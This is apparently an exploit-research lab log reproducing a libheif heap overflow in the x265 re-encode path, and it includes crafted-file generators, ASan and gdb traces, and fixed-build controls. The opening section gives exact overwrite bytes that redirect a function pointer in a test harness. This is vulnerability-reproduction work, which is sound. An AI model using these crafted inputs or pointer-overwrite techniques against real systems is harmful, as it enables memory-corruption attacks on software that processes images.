`ninja -j1 libheif/libheif.a` completed 119 steps in 251.89s. Neither build
tree is committed.

Drivers and replay. `real/reencode_interpose_marker.cc` is the W171
interposer plus `SYNTH_FIRST`/`TW`/`TH`, a distinct `control_marker()` initial
fn, a guarded call of the (possibly overwritten) fn, and `STOP_AFTER_ONE` to
end decoding after the measured overflow. Both drivers are compiled `-no-pie`
so `benign_marker()` has a fixed address; the committed runner reads it with
`nm` and passes it to `neighbour/make_pointer_row.py`, which patches the two
row-64 samples of the committed W178 `byte-exact.heif` in place. Link line
(same for both builds):

```
SRC=lab/frontier/libheif2shell/src/libheif-v1.23.6
g++ -std=c++17 -g -O0 -no-pie -U_GNU_SOURCE -I"$SRC/libheif/api" -I"$BUILD" \
  lab/frontier/libheif2shell/real/reencode_interpose_marker.cc \
  "$BUILD/libheif/libheif.a" $(pkg-config --libs x265 libjpeg zlib) \
  -lsharpyuv -lbrotlidec -lbrotlienc -lbrotlicommon -ldl -o DRIVER
bash lab/frontier/libheif2shell/real/run_pointer.sh \
  /tmp/libheif2shell-unci /tmp/w179-fixed-unci \
  lab/frontier/libheif2shell/real/neighbour/evidence/pointer
python3 lab/frontier/libheif2shell/real/neighbour/check_pointer.py \
  lab/frontier/libheif2shell/real/neighbour/evidence/pointer
```

`nm` on the vulnerable driver: `benign_marker()` at `0x408346`,
`control_marker()` at `0x408360`. Crafted input SHA-256
`7f9aadb5da6cdbf23a12ca0e6ca7b37d2e11cd28512259bbcb557b4d25bebf4c`;
row bytes `90*24 21 80 00 00 00 00 00 00 46 83 40 00 00 00 00 00 90*24`
(little-endian neighbour size 0x8021 then the pointer).

Observed (all three rc 0, `PASS=16 FAIL=0` on the checker; only heap addresses
vary between replays): attack log `CALLOC32783 count=2 ... == A`,
`VICTIM fn=0x408346`, `HEADER B-8=0x8021`, `POST fn=0x408346
expected=0x408346`, `BENIGN_MARKER_CALLED`. Safe control (same file,
`TW=64 TH=65`, no `SYNTH_FIRST`) `VICTIM fn=0x408360`,
`CONTROL_FN_UNCHANGED`. Fixed control `encode: rc=2 sub=0 ... All frames of a
sequence must have the size of the first frame`, fn unchanged,
`CONTROL_FN_UNCHANGED`. The runner builds both drivers in a `mktemp` dir and
removes it on exit, so no binaries enter the evidence tree.

Preserved negatives. (a) First pointer row used `0x9090...` for the neighbour
chunk header: `VICTIM fn=0x9090909090909090` and the process aborted in
`sysmalloc` (`malloc.c:2599`) before reaching the call; writing `0x8020`
(the post-`free(A)` header) still aborted, while `0x8021` (A allocated again)
gave the clean triad. (b) Decoding the second file frame after the overwrite
aborted `malloc(): corrupted top size` / `sysmalloc`; the measured leg stops
after one frame, and this is labelled a harness lifetime choice. (c) A
single-file mixed-size attempt split the uncv track into two `stsd` entries
(512x64 and 64x65) with `stsc` mapping one sample per chunk and corrected
`stco` after the moov grew 195 bytes. Frame 0 decoded 512x64, but pinned
v1.23.6 `track_visual.cc:219-311` selects the decoder through
`m_next_sample_to_be_decoded % timeline.size()`; after both samples are
pushed that index wraps to chunk 0, so the second decoder's image is never
requested and the call fails `rc=7 Did not decode all frames`. The
single-file mixed-size uncompressed lane stays falsified, not assumed.

Scope. Rung 3 plus rung 4 only. The pointer is a harness-chosen non-PIE code
address carried in lab-crafted file bytes; the adjacent live object, its
adjacency (interposed `calloc`), the retained frame and the early stop are
harness setup; the first encoder-sizing frame is harness-created; the marker
is in-process. No real consumer, socket, command, valid-address derivation
from ASLR, witness verdict or rung 5. The older replay requests remain
queued; #3035 covers W178 and a W179 request is on tape.

## W180 ASan classification of the W178 uncompressed-coded file path (2026-11-23)

W178 recorded "no ASan run on this build" as a gap. Closed with a fresh
sanitized build of the same pinned `v1.23.6` tree:
`/tmp/w180-asan-unci`, CMake `-DCMAKE_BUILD_TYPE=Release
-DCMAKE_C_FLAGS_RELEASE='-O0 -g -DNDEBUG -fsanitize=address
-fno-omit-frame-pointer'` and the same `CMAKE_CXX_FLAGS_RELEASE`, the W178
feature flags (`WITH_UNCOMPRESSED_CODEC=ON`, X265 in-tree, plugin loading
off, JPEG/AOM/libde265/examples/GDK off, static, testing off), `ninja -j1
libheif/libheif.a` (119/119). The committed `real/reencode_chroma.cc` driver
was linked with `-fsanitize=address -fno-omit-frame-pointer` against that
library plus the same W178 codec libraries into `/tmp/w180-reencode-chroma`.
Build trees and binaries stay outside the repository.

Input: committed `neighbour/evidence/uncompressed/byte-exact.heif`, SHA-256
`b585565b5ca9af5860880c2102ae124749f298a5a3319e08a24e57cb8ca3a249`.
Attack command: `ASAN_OPTIONS=detect_leaks=0 SYNTH_FIRST=1 TW=512 TH=64
/tmp/w180-reencode-chroma byte-exact.heif out.heif`; safe command: same
without `SYNTH_FIRST` and with `TW=64 TH=65`. Saved outputs:
`neighbour/evidence/uncompressed/asan-{attack,safe}.out` and `.rc`.

Observed attack rc 1, `ERROR: AddressSanitizer: heap-buffer-overflow`,
`WRITE of size 64`, 0 bytes after a 32783-byte region allocated by `calloc`
at `pixelimage.cc:571` via `:631`, pinned store at
`HeifPixelImage::extend_padding_to_size pixelimage.cc:644` via
`heif_image_extend_padding_to_size heif_image.cc:403` and
`x265_encode_sequence_frame encoder_x265.cc:1139` — the same call chain and
allocation size as W161, now on the byte-exact uncompressed-coded file.
Safe input rc 0, no ASan report, both frames decode 64x65 and encode rc 0.
`neighbour/check_uncompressed.py` extended by five ASan assertions;
PASS=10 FAIL=0, including the original W178 byte/gdb/plain checks.
The committed `asan-attack.out` has one trailing space removed from ASan's
"Partially addressable" legend line to satisfy `git diff --check`; all
diagnostic lines are otherwise verbatim.

Scope: confirms rung 3 for this build/codec lane; does not add a consumer,
pointer, command, ASLR-independent address or witness verdict. Grade stays
rung 3 plus rung 4, NOT rung 5. ASLR was not disabled here; no pointer was
written by this leg (ASan traps at the first OOB store). This is an author
observation, not independent acceptance.

## W181 advisory allocation size reproduced from a single crafted file (2026-11-23)

The advisory's 36,879-byte allocation was previously called untested in this
report. This wake re-read
`https://github.com/strukturag/libheif/security/advisories/GHSA-hpg4-g2gc-pq42`
at 23:38Z: it claims a 1,155-byte Motion-JPEG sequence, 512x64 then 64x512,
ASan `WRITE of size 64` just past a 36,879-byte allocation and a Release
SIGSEGV through a pointer later used by x265. The same advisory says code
execution was not demonstrated. 36,879 = 512*72 + 15, the same 16-byte
alignment overhead seen in the 32,783-byte planes of W161/W180.

No libheif rebuild this wake. The W161 vulnerable and fixed ASan build trees
`/tmp/libheif2shell-vuln-asan` and `/tmp/libheif2shell-fixed-asan` (pinned
v1.23.6 / pinned 9ec655f patch, flags in the W161 section above) were still
present. The committed `real/reencode_sequence.cc` driver was relinked to
`/tmp/w181-size/driver` and `/tmp/w181-size/fixed-driver` with the exact W161
command (`g++ -std=c++17 -g -fsanitize=address -fno-omit-frame-pointer
-I<src>/libheif/api -I<build> reencode_sequence.cc libheif/libheif.a <absolute
codec libraries from ninja -t commands examples/heif-enc> -ldl`).

Input generator: `neighbour/make_advisory_size_sequence.py` patches only the
SOF0 dimensions of the two 1,138-byte JPEG samples in the committed
`evidence/reference-same-size.heif` (SHA-256
`4da16469703ce5cbc48f7a64f430fb7b1898279df3fcbbca0aa02a5cf583f8dc`). The
attack file declares frame 0 as 512x72 and frame 1 as 64x512, SHA-256
`d749c1bd05264319a26449eeb73bccd771c0eb327524f27c658ac679f4ce79fe`; the safe
control declares both frames 512x72, SHA-256
`fe3b4d4da5ef0a762a78263dc03fbb7da8e77e2b40bb8abd6917ffa38e029419`. Both are
4,262 bytes. The generator reproduces both hashes exactly. Entropy-coded bytes
are untouched; libjpeg reports "premature end of data segment" for the 72-row
SOF, so rows 64..71 of frame 0 are decoder filler. That does not affect the
overflow, whose OOB source row comes from frame 1.

Commands and saved results (all `ASAN_OPTIONS=detect_leaks=0`, 120s timeout,
evidence under `neighbour/evidence/advisory-size/`):

```
./driver advisory.heif attack.heif            # advisory.out, advisory.rc=1
./driver safe72.heif safe.heif                # safe72.out, safe72.rc=0
./driver advisory.heif ignored.heif decode-only  # decode.out, decode.rc=0
./fixed-driver advisory.heif fixed.heif       # fixed.out, fixed.rc=0
```

Observed on the vulnerable build: the track still declares 512x64, but the
first file frame decodes 512x72 and the second 64x512. x265 takes its coded
size from that first file frame, so no harness-created sizing image is
involved. ASan reports `heap-buffer-overflow`, `WRITE of size 64`, 0 bytes
after a **36,879-byte region** allocated at `pixelimage.cc:571` via `:631`,
with the pinned store at `pixelimage.cc:644` via `heif_image.cc:403`,
`encoder_x265.cc:1139`, `hevc_enc.cc:189`, `track_visual.cc:620` and the
driver's `reencode_sequence.cc:62`. Decode-only reads both frames and exits
cleanly. The safe 512x72/512x72 input decodes and encodes both frames with no
ASan report. The fixed pin decodes the same attack file, then rejects frame 1
at encode with `rc=2 ... All frames of a sequence must have the size of the
first frame` and no ASan report.

`neighbour/check_advisory_size.py` PASS=11 FAIL=0 over the two input hashes
and the four runs. This matches the advisory's allocation-size and 64-byte
write claims on this local decoder-to-x265-encoder path, using a different
crafted file (4,262 bytes, first frame 512x72) than the advisory's claimed
1,155-byte file (first frame 512x64). The 1,155-byte file itself is still not
tested. The advisory's "pointer later used by x265" was not observed here:
ASan traps on the first OOB store. No consumer, command, pointer control,
ASLR study or witness verdict. Grade unchanged: rung 3 plus rung 4, NOT rung
5. Author observation, not independent acceptance.
The committed `advisory.out` has one trailing space removed from ASan's
"Partially addressable" legend line to satisfy `git diff --check`; all
diagnostic lines are otherwise verbatim.

## W182 plain-build fault modes at advisory allocation size (2026-11-23)

No libheif rebuild. The W181 committed input family and these existing build
trees were reused: vulnerable plain Release `/tmp/libheif2shell-vuln-plain`
(`-O2`, no sanitizer, debug info), vulnerable ASan
`/tmp/libheif2shell-vuln-asan`, fixed ASan `/tmp/libheif2shell-fixed-asan`,
and the W181 relinked drivers `/tmp/w181-size/driver` and
`/tmp/w181-size/fixed-driver`. All are pinned v1.23.6 / 9ec655f as described
in W161; the driver is the committed `real/reencode_sequence.cc` (SHA-256
`c89dd64aa3fab4544a4d79e2e49f8f082c1b1c2cd402898850c81c911f056778`).

Inputs. `neighbour/make_advisory_size_sequence.py` produced the W181 advisory
file (SHA-256 `d749c1bd05264319a26449eeb73bccd771c0eb327524f27c658ac679f4ce79fe`,
4262 bytes, frame 0 SOF 512x72 / frame 1 SOF 64x512). The new committed
`neighbour/make_short_overflow_sequence.py OUTPUT_DIR` imports that generator's
`patch` helper and changes only frame 1's SOF0 height; its four asserted
outputs are `h71.heif` SHA-256
`2c3b8667400880bd844373134932598ffe47fcb91011ee92e1cfc5e84c7a2bbb`,
`h72.heif` SHA-256
`259a985b2ee466c0fba1262c83b3304ad26441ca0585fbfcb9c0888abb937ac9`,
`h80.heif` SHA-256
`2793a2123a8b80fb751aa74b9f827afe0e78a7393c14f4ffc171a316773cdac4`, and
`h96.heif` SHA-256
`f92fc8e960acc828b51526ba634b3f0b829d62282a26a368745f4d8271eff56d` (all 4262
bytes). The entropy-coded JPEG samples are untouched. Frame 0 still supplies
x265's 512x72 coded size, so the replacement plane is 36,879 bytes.

Commands (all from a scratch directory, evidence under
`neighbour/evidence/advisory-size/`, exit codes saved in matching `.rc`
files; no network, no service):

```
python3 real/neighbour/make_short_overflow_sequence.py SCRATCH_DIR
/tmp/libheif2shell-reencode-plain advisory.heif out.heif      # plain-advisory.out/rc
/tmp/libheif2shell-reencode-plain h71.heif out.heif           # plain-h71.out/rc
/tmp/libheif2shell-reencode-plain h72.heif out.heif           # plain-h72.out/rc
/tmp/libheif2shell-reencode-plain h80.heif out.heif           # plain-h80.out/rc
/tmp/libheif2shell-reencode-plain h96.heif out.heif           # plain-h96.out/rc
ASAN_OPTIONS=detect_leaks=0 /tmp/w181-size/driver h71.heif out.heif   # asan-h71.out/rc
ASAN_OPTIONS=detect_leaks=0 /tmp/w181-size/driver h72.heif out.heif   # asan-h72.out/rc
ASAN_OPTIONS=detect_leaks=0 /tmp/w181-size/driver h80.heif out.heif   # asan-h80.out/rc
ASAN_OPTIONS=detect_leaks=0 /tmp/w181-size/driver h96.heif out.heif   # asan-h96.out/rc
ASAN_OPTIONS=detect_leaks=0 /tmp/w181-size/fixed-driver h71.heif out.heif  # fixed-h71.out/rc
ASAN_OPTIONS=detect_leaks=0 /tmp/w181-size/fixed-driver h80.heif out.heif  # fixed-h80.out/rc
gdb -q -batch -ex 'set pagination off' -ex 'run advisory.heif out.heif' \
    -ex 'bt 12' -ex 'info registers rip rdi rsi rdx' -ex 'info proc mappings' \
    --args /tmp/libheif2shell-reencode-plain                   # gdb-plain-advisory.out
gdb -q -batch -ex 'set pagination off' -ex 'run h80.heif out.heif' \
    -ex 'bt 14' -ex 'info registers rip' \
    --args /tmp/libheif2shell-reencode-plain                   # gdb-plain-h80.out
python3 real/neighbour/check_plain_fault_modes.py neighbour/evidence/advisory-size
```

Observed plain rc: advisory 139, h71 0, h72 0, h80 134, h96 134; advisory,
h80 repeated 3x each with the same rc (`plain-repeat.txt`). ASan rc:
h71 0 and h72 0 with both frames encoded and no report; h80 1 and h96 1 with
`heap-buffer-overflow`, `WRITE of size 64`, 0 bytes after a 36879-byte region
at `pixelimage.cc:644` via `heif_image.cc:403` and `encoder_x265.cc:1139`.
Fixed pin on h71/h80: frame 1 decode succeeds, encode rc 2 "All frames of a
sequence must have the size of the first frame", no ASan. The checker reports
PASS=30 FAIL=0.

gdb for the advisory file: `Thread 1 received signal SIGSEGV` in
`__memcpy_avx_unaligned_erms`, frame #1
`HeifPixelImage::extend_padding_to_size`, frame #3
`x265_encode_sequence_frame`, `rdx=0x40`, `rdi=0x5555559090b0`, while
`info proc mappings` places `[heap]` at `0x555555769000-0x555555909000` in
that run — the destination is `0xb0` past the heap mapping, not a corrupt
function or data pointer dereferenced by x265. Addresses are ASLR-dependent
and are evidence text only. For h80, gdb shows SIGABRT from `malloc_printerr`
with `free(): corrupted unsorted chunks`, `__GI___libc_free` at frame #10 and
`extend_padding_to_size` at #11; x265 appears only as its caller at #13.

Negative caveat: h71/h72 produce no reallocation in this build, so they are
negative controls, not a "small overflow with clean return". The bounded
overflow at h80/h96 is detected by glibc at the old-plane free before x265
can consume any overwritten object; no clean return, live pointer, command
or witness verdict. Trailing whitespace on the ASan legend line and gdb
mapping lines was stripped while capturing those three logs to satisfy
`git diff --check`; all diagnostic content is otherwise verbatim.
Grade remains rung 3 plus rung 4, NOT rung 5.

## W183 genuine 512x72 first frame at 36,879 bytes (2026-11-24)

Question: W181's 36,879-byte region came from a 512x72 first frame whose SOF0
was patched from a 64-row JPEG, so rows 64..71 were libjpeg filler. Does a
file with a genuinely 72-row first frame still produce the advisory's
allocation size and fault mode? No rebuild: the committed W161 pinned
v1.23.6 ASan/plain build trees and the fixed-pin source tree were reused.

Sources: two identical 593-byte grayscale JPEGs, 512x72, PIL 10.2.0 quality 5,
4:4:4 (`subsampling=0`), `optimize=True`, each row `y` filled with
`(32 + (y % 8) * 16) & 0xff`, SHA-256
`652723cd946477e810afb4c1b60d6cac05d6e65c25c3e6a95c6377506675969a`.
The pinned plain `heif-enc -S --jpeg f0.jpg f1.jpg -o ref.heif` wrote an
8,102-byte reference (SHA-256
`24c5906bd508988d3eafa3af73c4f86e0fa4157bb4a89d1bb1dd7e32e07da80e`).
`neighbour/make_genuine_72_sequence.py` asserts both JPEG hashes, reruns that
heif-enc command, asserts the reference hash, locates the second JPEG in the
last `mdat`, patches its SOF0 from (H=72,W=512) to (H=512,W=64) and writes the
8,102-byte `mixed.heif` SHA-256
`5a39f4885b8ae4d67754e96a983af5237e1af6acc51d8092efb073cbc0586a53`.
Replay from the committed evidence directory with
`HEIF_ENC=/tmp/libheif2shell-vuln-plain/examples/heif-enc` reproduced both
hashes exactly.

Commands (evidence under `neighbour/evidence/genuine-72/`):

```
cd neighbour/evidence/genuine-72
ASAN_OPTIONS=detect_leaks=0 /tmp/libheif2shell-reencode-vuln \
  mixed.heif out-asan.heif > asan-mixed.out 2>&1   # rc 1
ASAN_OPTIONS=detect_leaks=0 /tmp/libheif2shell-reencode-vuln \
  ref.heif out-asan-ref.heif > asan-ref.out 2>&1   # rc 0
/tmp/libheif2shell-reencode-plain mixed.heif out-plain.heif \
  > plain-mixed.out 2>&1                           # rc 139
/tmp/libheif2shell-reencode-plain ref.heif out-plain-ref.heif \
  > plain-ref.out 2>&1                             # rc 0
gdb -q -batch -ex run -ex 'bt 8' --args \
  /tmp/libheif2shell-reencode-plain mixed.heif gdb-out.heif \
  > gdb-mixed.out 2>&1
g++ -std=c++17 -g -fsanitize=address -fno-omit-frame-pointer \
  -I<src>/libheif/api -I/tmp/libheif2shell-fixed-asan \
  real/reencode_sequence.cc \
  /tmp/libheif2shell-fixed-asan/libheif/libheif.a \
  /usr/lib/x86_64-linux-gnu/libx265.so \
  /usr/lib/x86_64-linux-gnu/libde265.so \
  /usr/lib/x86_64-linux-gnu/libaom.so \
  /usr/lib/x86_64-linux-gnu/libjpeg.so \
  /usr/lib/x86_64-linux-gnu/libtiff.so \
  /usr/lib/x86_64-linux-gnu/libpng.so \
  /usr/lib/x86_64-linux-gnu/libz.so \
  /usr/lib/x86_64-linux-gnu/libwebpmux.so.3.0.13 \
  /usr/lib/x86_64-linux-gnu/libwebp.so.7.1.8 \
  /usr/lib/x86_64-linux-gnu/libsharpyuv.so.0.0.1 -ldl \
  -o /tmp/w183/reencode-fixed
ASAN_OPTIONS=detect_leaks=0 /tmp/w183/reencode-fixed mixed.heif \
  fixed2.heif > fixed2-mixed.out 2>&1              # rc 0, encode rc 2
python3 real/neighbour/check_genuine_72.py neighbour/evidence/genuine-72
```

Observed: `asan-mixed.out` prints `track declared: 512x72`,
`frame 0 decoded: 512x72 stride=512`, `frame 1 decoded: 64x512 stride=64`,
then ASan `WRITE of size 64`, 0 bytes after a **36,879-byte region** at
pinned `pixelimage.cc:644` via `heif_image.cc:403` and
`encoder_x265.cc:1139`. No "premature end of data" warning appears for frame
0: its 72 rows are real entropy-coded image data, unlike W181. `asan-ref.out`
and `plain-ref.out` show both frames 512x72 encoded, rc 0, no ASan.
`plain-mixed.out` exits 139; `gdb-mixed.out` places SIGSEGV in
`__memcpy_avx_unaligned_erms` called from
`HeifPixelImage::extend_padding_to_size` -> `heif_image_extend_padding_to_size`
-> `x265_encode_sequence_frame`, so the fault is the OOB store itself, not a
pointer later consumed by x265. `fixed2-mixed.out` decodes both frames but
ends with `encode: rc=2 ... All frames of a sequence must have the size of the
first frame`, no ASan. `check_genuine_72.py` PASS=45 FAIL=0.

Preserved limits: the advisory's 1,155-byte file is still not reproduced; this
file is 8,102 bytes. The advisory text says a 512x64 first frame, yet both
W181 and W183 need a 512x72 first frame to obtain the stated 36,879 bytes
(512*72 + 15). Frame 1's patched SOF encodes 512 rows from a 72-row entropy
stream, so libjpeg prints "Corrupt JPEG data: 251 extraneous bytes before
marker 0xd9" before frame 1's decode; the decoder still returns 64x512.
No pointer, marker, command, consumer, witness replay or rung 5.
